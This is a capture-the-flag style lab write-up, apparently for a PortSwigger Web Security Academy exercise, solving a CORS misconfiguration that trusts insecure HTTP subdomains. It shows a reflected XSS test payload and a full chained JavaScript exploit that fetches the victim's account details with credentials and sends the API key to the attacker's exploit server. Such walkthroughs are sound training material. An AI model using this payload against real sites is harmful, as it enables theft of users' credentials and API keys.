# Lab: CORS vulnerability with trusted insecure protocols

## Lab Description

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/c889f28a-9775-4661-8c09-2ae04823949f)

## Solution

Log in using the given username and password.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/61b2943b-cf7c-496f-8603-26dbcd55ddb0)

The apikey is retrieved via an AJAX request to `/accountDetails`, and the response contains the `Access-Control-Allow-Credentials` header suggesting that it may support CORS.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/f4cf050d-5036-4861-bb0f-d06cb4f553a0)

Send the request to Burp Repeater, and resubmit it with the added header `Origin:http://malicious.com`. `Origin` is not being reflected in the `Access-Control-Allow-Origin` header.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/477d8387-24ee-4c54-9cd1-8207a90359c6)

Resubmit it by changing header `Origin: http://subdomain.lab-id` where `lab-id` is the lab domain name. The origin is reflected in the `Access-Control-Allow-Origin` header, confirming that the `CORS` configuration allows access from arbitrary subdomains, both HTTPS and HTTP.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/0c9a1342-4720-462f-a261-941b42e90585)

There is a check stock feature in the webpage. It is loaded using a HTTP URL on a subdomain.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/0b3b6c9b-1156-455b-bad5-8ea709a90901)

Change the productId parameter value to `<script>alert(420)</script>` and it's evident that `productId` parameter has a XSS vulnerability.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/50c45a7f-4c5b-4210-9b4d-c510c73414a1)

Go to exploit server and copy the following script.

```Javascript
<script>
    document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

Click on store and deliver to victim.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/5b18d420-0e02-4f20-bea6-3aeea9a515e4)

Then go to the access logs apikey will be present in the URL.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/41847a84-6c9a-4521-8b30-c0cbf7a1ff43)

Paste the apikey in the **Submit Solution** section and finish the lab.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/bfc6d3aa-bdf0-46b3-be4b-3969a3d0c164)
